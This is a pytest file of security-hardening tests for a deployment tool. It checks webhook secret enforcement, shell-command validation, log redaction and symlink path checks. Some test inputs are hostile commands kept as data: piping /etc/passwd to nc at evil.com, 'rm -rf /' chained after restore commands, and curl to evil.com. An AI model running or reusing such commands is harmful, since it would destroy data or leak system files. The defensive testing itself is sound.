"""Phase 2 security hardening tests.

Cycle 1: Webhook secret required on startup
Cycle 2: Validate restore_command
Cycle 3: Harden exec health check commands
Cycle 4: Expand log redaction
Cycle 5: Tighten path validation
"""

import os
from unittest.mock import patch

import pytest

from fraisier.dbops._validation import validate_file_path

# ---------------------------------------------------------------------------
# Cycle 1: Webhook secret required on startup
# ---------------------------------------------------------------------------


class TestWebhookSecretRequired:
    """Webhook server must refuse to start without a valid secret."""

    def test_webhook_server_refuses_to_start_without_secret(self):
        from fraisier.webhook import _get_webhook_secret

        with (
            patch.dict(os.environ, {}, clear=True),
            patch("fraisier.webhook.get_config") as mock_config,
        ):
            mock_config.return_value.get_git_provider_config.return_value = {}
            with pytest.raises(
                RuntimeError, match="FRAISIER_WEBHOOK_SECRET must be set"
            ):
                _get_webhook_secret()

    def test_webhook_secret_rejects_too_short(self):
        from fraisier.webhook import _get_webhook_secret

        with (
            patch.dict(os.environ, {"FRAISIER_WEBHOOK_SECRET": "short"}),
            pytest.raises(RuntimeError, match="at least 32 characters"),
        ):
            _get_webhook_secret()

    def test_webhook_secret_accepts_valid(self):
        from fraisier.webhook import _get_webhook_secret

        secret = "a" * 32
        with patch.dict(os.environ, {"FRAISIER_WEBHOOK_SECRET": secret}):
            assert _get_webhook_secret() == secret


# ---------------------------------------------------------------------------
# Cycle 2: Validate restore_command
# ---------------------------------------------------------------------------


class TestValidateShellCommand:
    """Shell commands from config must be validated."""

    def test_rejects_semicolon(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x; rm -rf /")

    def test_rejects_pipe(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("cat /etc/passwd | nc evil.com 1234")

    def test_rejects_command_substitution(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore $(whoami)")

    def test_rejects_backtick_substitution(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore `whoami`")

    def test_rejects_double_ampersand(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x && rm -rf /")

    def test_rejects_double_pipe(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("pg_restore /tmp/x || echo pwned")

    def test_accepts_valid_pg_restore(self):
        from fraisier.dbops._validation import validate_shell_command

        result = validate_shell_command(
            "pg_restore --dbname=mydb /var/backups/latest.dump"
        )
        assert result == [
            "pg_restore",
            "--dbname=mydb",
            "/var/backups/latest.dump",
        ]

    def test_accepts_valid_psql(self):
        from fraisier.dbops._validation import validate_shell_command

        result = validate_shell_command("psql -f /tmp/restore.sql mydb")
        assert result[0] == "psql"

    def test_rejects_when_allowlist_provided(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="not in allowed"):
            validate_shell_command(
                "curl http://evil.com", allowed_binaries={"pg_restore", "psql"}
            )


# ---------------------------------------------------------------------------
# Cycle 3: Harden exec health check commands
# ---------------------------------------------------------------------------


class TestExecHealthCheckValidation:
    """Health check exec commands must be validated."""

    def test_exec_health_check_rejects_dangerous_commands(self):
        from fraisier.dbops._validation import validate_shell_command

        with pytest.raises(ValueError, match="metacharacter"):
            validate_shell_command("curl http://localhost:8000 && rm -rf /")


# ---------------------------------------------------------------------------
# Cycle 4: Expand log redaction
# ---------------------------------------------------------------------------


class TestLogRedaction:
    """Log redaction must cover all secret variants."""

    def test_redacts_webhook_secret(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"webhook_secret": "s3cr3t", "name": "app"}
        redacted = logger._redact_dict(data)
        assert redacted["webhook_secret"] == "***REDACTED***"
        assert redacted["name"] == "app"

    def test_redacts_db_password(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"db_password": "hunter2"}
        assert logger._redact_dict(data)["db_password"] == "***REDACTED***"

    def test_redacts_private_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"private_key": "-----BEGIN RSA KEY-----"}
        assert logger._redact_dict(data)["private_key"] == "***REDACTED***"

    def test_redacts_api_token(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"api_token": "ghp_xxxx"}
        assert logger._redact_dict(data)["api_token"] == "***REDACTED***"

    def test_redacts_ssh_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"ssh_key": "/path/to/id_rsa"}
        assert logger._redact_dict(data)["ssh_key"] == "***REDACTED***"

    def test_does_not_redact_primary_key(self):
        from fraisier.logging import ContextualLogger

        logger = ContextualLogger("test")
        data = {"primary_key": "42"}
        assert logger._redact_dict(data)["primary_key"] == "42"


# ---------------------------------------------------------------------------
# Cycle 5: Tighten path validation
# ---------------------------------------------------------------------------


class TestPathValidation:
    """Path validation: symlinks must not escape base_dir."""

    def test_symlink_escape_rejected(self, tmp_path):
        base_dir = tmp_path / "safe"
        base_dir.mkdir()
        target = tmp_path / "unsafe" / "secrets.txt"
        target.parent.mkdir()
        target.write_text("secret data")

        link = base_dir / "escape"
        link.symlink_to(target)

        with pytest.raises(ValueError, match=r"[Ss]ymlink"):
            validate_file_path(str(link), base_dir=base_dir, strict=True)

    def test_docker_cp_rejects_relative_path(self):
        from fraisier.dbops._validation import validate_docker_cp_path

        with pytest.raises(ValueError, match="must start with /"):
            validate_docker_cp_path("mycontainer:relative/path")

    def test_docker_cp_accepts_absolute_path(self):
        from fraisier.dbops._validation import validate_docker_cp_path

        result = validate_docker_cp_path("mycontainer:/var/lib/data")
        assert result == "mycontainer:/var/lib/data"

    def test_strict_mode_rejects_any_symlink(self, tmp_path):
        base_dir = tmp_path / "safe"
        base_dir.mkdir()
        real = base_dir / "real.txt"
        real.write_text("data")
        link = base_dir / "link.txt"
        link.symlink_to(real)

        with pytest.raises(ValueError, match=r"[Ss]ymlink"):
            validate_file_path(str(link), base_dir=base_dir, strict=True)
